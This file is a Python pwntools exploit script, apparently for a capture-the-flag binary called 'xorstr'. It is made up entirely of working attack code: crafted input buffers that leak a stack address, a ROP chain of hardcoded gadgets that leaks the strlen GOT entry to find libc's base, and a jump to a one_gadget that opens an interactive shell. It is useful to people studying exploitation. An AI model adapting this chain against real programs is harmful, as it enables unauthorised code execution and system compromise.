from pwn import *
import time
import sys


def exploit(proc):
    buf = 'A' * 127 + '\x00'
    buf += 'A' * 127 + '\x00'
    buf += '\x00' * 128
    buf += 'A' * 128
    proc.send(buf)
    proc.recvuntil('Your string:What do you want to xor :Result:Your string:What do you want to xor :Result:')
    process_rbp = proc.recvuntil('Your string:')
    process_rbp = u64(process_rbp[-12-6:-12] + '\x00\x00')
    print 'process_rbp:', hex(process_rbp)
    main_rbp = process_rbp + 0x10
    str_adr = main_rbp - 0x90
    print 'main_rbp:', hex(main_rbp)
    print 'str_adr:', hex(str_adr)
    str_xor_main = str_adr ^ main_rbp
    print 'str ^ main:', hex(str_xor_main)
    str_xor_main = p64(str_xor_main).replace('\x00', '')
    print len(str_xor_main)

    pop_rbp = 0x0000000000400748
    pop_rsi_r15 = 0x0000000000400a21
    pop_rdi = 0x0000000000400a23
    printf_leave = 0x0000000000400953
    strlen_got = 0x600e90
    strlen_offset = 0x8b720
    read_plt = 0x400690
    read_input_adr = 0x00000000004007c7

    rop_chain = flat([pop_rbp, str_adr + 56, pop_rsi_r15, strlen_got, 0, printf_leave, 0xdeadbeef, pop_rsi_r15, 0x80, 0, pop_rdi, str_adr + 14 * 8, read_input_adr])

    buf = 'A' * 127 + '\x00'
    buf += 'B' * len(str_xor_main) + 'A' + '\x00' * (128 - len(str_xor_main) - 1)
    buf += '\x00' * 8 + rop_chain + '\x00' * (120 - len(rop_chain))
    buf += str_xor_main + 'A' * (128 - len(str_xor_main))
    proc.send(buf)
    proc.recvuntil('Your string:What do you want to xor :Result:')
    proc.recvuntil('Result:')
    strlen_adr = u64(proc.recv() + '\x00\x00')
    libc_adr = strlen_adr - strlen_offset
    one_gadget = 0x4526a + libc_adr
    print 'libc_adr:', hex(libc_adr)

    buf = flat([one_gadget, '\x00' * 0x100])
    raw_input('wait')
    proc.send(buf)


if __name__ == '__main__':
    context.arch = 'amd64'
    if len(sys.argv) > 1:
        proc = remote('0', 1234)
        #proc = process('./xorstr')
    else:
        #b *xorstr+193
        #b *process+40
        #b *process+35
        proc = process('./xorstr', env={'LD_LIBRARY_PATH': './'})
        gdb.attach(proc, '''
        set follow-fork-mode child
        b *xorstr+63
        b *xorstr+192
        continue
        ''')
    exploit(proc)
    proc.interactive()
